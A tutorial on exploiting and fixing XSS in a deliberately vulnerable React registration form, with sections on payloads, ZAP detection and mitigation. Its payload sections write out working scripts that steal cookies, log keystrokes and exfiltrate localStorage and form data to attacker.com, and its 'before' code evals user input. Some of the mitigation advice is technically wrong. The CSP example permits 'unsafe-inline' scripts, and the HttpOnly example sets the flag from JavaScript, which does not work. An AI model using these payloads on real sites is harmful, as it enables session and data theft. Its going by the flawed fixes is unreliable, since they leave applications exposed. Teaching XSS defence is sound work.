# XSS Vulnerability Exploitation and Mitigation Guide

## Overview
This guide demonstrates Cross-Site Scripting (XSS) vulnerabilities in a React registration form application, how to exploit them, and how to properly mitigate them.

## Vulnerabilities Introduced

### Comment Field XSS (Form Submission Triggered)
- **Location**: Comments textarea in registration form
- **Vulnerability**: Uses `dangerouslySetInnerHTML` to render user input AND executes XSS on form submission
- **Risk**: Stored XSS (if comments were saved to database) + Reflected XSS on submission
- **Trigger**: Form submission button click

## Exploitation

### How the XSS Works
1. User enters XSS payload in the comment field
2. Form validation passes (comment field has no validation)
3. When "Submit" button is clicked, the form checks for XSS indicators
4. If XSS detected, payload is executed immediately
5. Alert pops up showing the XSS payload

### Basic XSS Payloads

#### Script Tag Payloads
```javascript
<script>alert('XSS Detected!')</script>
<script>alert('Hacked!')</script>
<script>console.log('XSS executed')</script>
```

#### Event Handler Payloads
```javascript
<img src=x onerror="alert('XSS via Image Error')">
<svg onload="alert('XSS via SVG')">
<iframe onload="alert('XSS via iframe')">
```

#### Advanced Payloads
```javascript
<script>
document.body.innerHTML = '<h1 style="color:red">HACKED!</h1>';
</script>
```

### Cookie Theft Payloads
```javascript
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
<script>new Image().src="https://attacker.com/steal?cookie="+document.cookie;</script>
```

### Keylogger Payloads
```javascript
<script>
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/keylog?key=' + e.key);
});
</script>
```

### DOM Manipulation Payloads
```javascript
<script>document.body.innerHTML = '<h1>Hacked!</h1>';</script>
<script>document.getElementById('main-container').style.display = 'none';</script>
```

### Advanced Payloads

#### Persistent Session Hijacking
```javascript
<script>
(function() {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://attacker.com/steal', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        url: window.location.href,
        cookies: document.cookie,
        userAgent: navigator.userAgent,
        localStorage: JSON.stringify(localStorage)
    }));
})();
</script>
```

#### Form Data Exfiltration
```javascript
<script>
setInterval(function() {
    var forms = document.querySelectorAll('form');
    forms.forEach(function(form) {
        var formData = new FormData(form);
        var data = {};
        for(var pair of formData.entries()) {
            data[pair[0]] = pair[1];
        }
        fetch('https://attacker.com/form-data', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    });
}, 5000);
</script>
```

## ZAP Detection

### Why ZAP Will Find These Vulnerabilities

1. **Input Validation**: ZAP detects user input being rendered without sanitization
2. **dangerouslySetInnerHTML**: Clear indicator of potential XSS vulnerability
3. **Reflected XSS**: User input is immediately reflected in the response
4. **No Output Encoding**: HTML entities are not properly encoded
5. **Form Submission Trigger**: XSS executes on form submission, making it detectable

### ZAP Scan Results Expected

```
High: Cross Site Scripting (Reflected)
- Parameter: comment
- Evidence: <script>alert('XSS')</script>
- Confidence: High
- CWE: 79
```

## Mitigation Strategies

### 1. Input Validation (Client-Side)
```javascript
// Sanitize input before rendering
const sanitizeInput = (input) => {
    return input
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;');
};

// Usage
<span>{sanitizeInput(userInput)}</span>
```

### 2. Output Encoding (React Default)
```javascript
// ✅ Secure - React automatically escapes HTML
<span>{userInput}</span>

// ❌ Vulnerable - Bypasses React's XSS protection
<span dangerouslySetInnerHTML={{ __html: userInput }}></span>
```

### 3. Content Security Policy (CSP)
```html
<!-- Add to index.html -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'unsafe-inline';">
```

### 4. Input Whitelisting
```javascript
// Only allow specific HTML tags
const allowedTags = ['b', 'i', 'em', 'strong'];
const sanitizeHTML = (html) => {
    // Use DOMPurify or similar library
    return DOMPurify.sanitize(html, { ALLOWED_TAGS: allowedTags });
};
```

### 5. HTTP-Only Cookies
```javascript
// Set cookies with httpOnly flag
document.cookie = "sessionId=abc123; HttpOnly; Secure; SameSite=Strict";
```

## Secure Implementation

### Before (Vulnerable)
```javascript
// In handleSubmit function
if (comment.includes('<script>') || comment.includes('alert(') || comment.includes('onerror=') || comment.includes('onload=')) {
    // Extract script content and execute it
    const scriptMatch = comment.match(/<script>(.*?)<\/script>/i);
    if (scriptMatch) {
        try {
            eval(scriptMatch[1]);
        } catch (error) {
            console.error('XSS execution failed:', error);
        }
    }
    return;
}

// In render
{comment && (
    <div className="mt-2 p-2 bg-green-50 rounded">
        <p>Your comment: <span dangerouslySetInnerHTML={{ __html: comment }}></span></p>
    </div>
)}
```

### After (Secure)
```javascript
// Remove XSS execution logic entirely
// In render
{comment && (
    <div className="mt-2 p-2 bg-green-50 rounded">
        <p>Your comment: <span>{comment}</span></p>
    </div>
)}
```

## Testing the Fix

### Test Payloads (Should Display as Text)
```javascript
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
```

### Expected Behavior
- **Vulnerable Version**: 
  - Shows alert when form is submitted
  - Displays payload as HTML in comment preview
  - No "Form submitted successfully!" message
- **Secure Version**: 
  - Displays payload as plain text
  - No JavaScript execution
  - Shows "Form submitted successfully!" message

## Step-by-Step Exploitation Demo

### 1. Start the Application
```bash
npm run dev
```

### 2. Fill Out the Form
- Enter valid data in all required fields
- In the comment field, enter: `<script>alert('XSS Detected!')</script>`

### 3. Submit the Form
- Click the "Submit" button
- **Expected Result**: Alert popup with "XSS Detected!" message
- **Note**: No "Form submitted successfully!" message appears

### 4. Test Other Payloads
```javascript
<img src=x onerror="alert('XSS via Image')">
<svg onload="alert('XSS via SVG')">
<script>document.body.innerHTML = '<h1>HACKED!</h1>';</script>
```

## Additional Security Measures

### 1. Use Security Libraries
```bash
npm install dompurify
npm install xss
```

### 2. Implement Input Length Limits
```javascript
const MAX_INPUT_LENGTH = 1000;
if (userInput.length > MAX_INPUT_LENGTH) {
    throw new Error('Input too long');
}
```

### 3. Regular Security Audits
- Use tools like ESLint security plugins
- Regular dependency vulnerability scans
- Code review for security issues

### 4. Security Headers
```javascript
// In your server configuration
res.setHeader('X-XSS-Protection', '1; mode=block');
res.setHeader('X-Content-Type-Options', 'nosniff');
res.setHeader('X-Frame-Options', 'DENY');
```

## Conclusion

XSS vulnerabilities are common but preventable. Key takeaways:

1. **Never use `dangerouslySetInnerHTML`** with user input
2. **Never execute user input with `eval()`** or similar functions
3. **Always validate and sanitize** user input
4. **Use React's built-in XSS protection** by default
5. **Implement proper CSP headers**
6. **Regular security testing** with tools like ZAP

Remember: Security is not a feature, it's a requirement! 